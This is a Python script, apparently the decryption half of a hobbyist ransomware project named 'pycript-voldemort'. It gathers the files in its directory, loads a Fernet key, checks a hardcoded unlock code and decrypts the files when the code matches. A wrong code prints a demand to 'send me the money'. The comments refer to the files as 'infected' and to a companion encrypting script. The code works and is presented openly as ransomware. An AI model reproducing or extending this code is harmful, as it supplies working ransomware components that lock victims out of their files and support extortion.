#! usr/bin/env python3
#	Above line is **sha-bang**. Besides its fancy name, it has a use case, watch out online. IT's COOL btw.

#python script for Encryption - pycript.

import os
#Fernet is a py lib for encryption-decryption ops
from cryptography.fernet import Fernet

files = [] # To store the files, that will be infected


#so basically, here we are just adding all TARGET files, which are those in the current Dir, to the files list.. Except our script. 
#Coz, script shouldnt be encrypted
for file in os.listdir():
	if file == "pycript-voldemort.py" or file == "thekey.key" or file == "decrypt.py" or file == "status.txt":
		continue

#	This is done, so if there is any dir in the current dir, it should not be affected
	if os.path.isfile(file):
		files.append(file)

print (files)

#Getting key from the thekey.key
with open("thekey.key", "rb") as key:
	key = key.read()

#DECRYPTING THE CONTENTS!


secret_code = "callmedaddy" #lol
user_code = input("Enter the secret code to unlock the files\n")

with open("status.txt", "r") as status:
	status_encryption = status.read()

if status_encryption == "":
	print ("Files not Encrypted, So can't decrypt!")

else :

	if secret_code == user_code:
		for file in files:





		#	Read file contents and prepared the decrypted contents
			with open(file, "rb") as thefile:
				contents = thefile.read()

			contents_decrypted = Fernet(key).decrypt(contents)

		#	Writing the decrypted contents in files
			with open(file, "wb") as thefile:
				thefile.write(contents_decrypted)


		print ("Congratulations! Your files are DECRYPTED")

		with open("status.txt", "w") as status:
			status.write("")


	else :
		print ("WRONG CODE! Your files are at risk if you dont send me the money!!")
